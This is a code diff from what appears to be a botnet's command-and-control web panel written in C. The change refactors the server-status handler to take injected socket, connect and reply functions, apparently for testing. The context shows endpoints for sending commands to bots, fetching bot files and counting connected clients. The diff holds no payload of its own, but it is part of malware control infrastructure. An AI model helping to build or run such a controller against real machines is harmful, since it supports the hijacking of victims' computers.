@@ -183,7 +183,13 @@ void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
 }
 
 // Function to handle server status
-void handle_server_status(struct mg_connection *c, struct mg_http_message *hm) {
+void handle_server_status(
+    struct mg_connection *c,
+    struct mg_http_message *hm,
+    int (*socket_func)(int, int, int),
+    int (*connect_func)(int, const struct sockaddr *, socklen_t),
+    void (*reply_func)(struct mg_connection *, int, const char *, const char *, ...)
+) {
     const char *botnet_server_ip = DEFAULT_SERVER_ADDR;
     int botnet_server_port = atoi(DEFAULT_SERVER_PORT);
     const char *web_server_ip = DEFAULT_WEB_ADDR;
@@ -191,14 +197,14 @@ void handle_server_status(struct mg_connection *c, struct mg_http_message *hm) {
 
     // is botnet server active? (attempt connection)
     bool botnet_server_active = false;
-    int botnet_socket = socket(AF_INET, SOCK_STREAM, 0);
+    int botnet_socket = socket_func(AF_INET, SOCK_STREAM, 0);
     if (botnet_socket >= 0) {
         struct sockaddr_in botnet_addr;
         botnet_addr.sin_family = AF_INET;
         botnet_addr.sin_port = htons(botnet_server_port);
         inet_pton(AF_INET, botnet_server_ip, &botnet_addr.sin_addr);
 
-        if (connect(botnet_socket, (struct sockaddr *)&botnet_addr, sizeof(botnet_addr)) == 0) {
+        if (connect_func(botnet_socket, (struct sockaddr *)&botnet_addr, sizeof(botnet_addr)) == 0) {
             botnet_server_active = true;
         }
         close(botnet_socket);
@@ -254,8 +260,9 @@ void handle_server_status(struct mg_connection *c, struct mg_http_message *hm) {
              connected_clients,
              unreachable_clients);
 
+
     // Send resp
-    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response);
+    reply_func(c, 200, "Content-Type: application/json\r\n", "%s", response);
 }
 
 void handle_get_bot_file(struct mg_connection *c, struct mg_http_message *hm) {
@@ -446,7 +453,7 @@ void handle_request(struct mg_connection *c, int ev, void *ev_data) {
         } else if (strncmp(hm->uri.buf, "/api/command", hm->uri.len) == 0) {
             handle_send_command(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/status", hm->uri.len) == 0) {
-            handle_server_status(c, hm);
+            handle_server_status(c, hm, socket, connect, mg_http_reply);
         } else if (strncmp(hm->uri.buf, "/api/botfile", hm->uri.len) == 0) {
             handle_get_bot_file(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/cwd", hm->uri.len) == 0) {
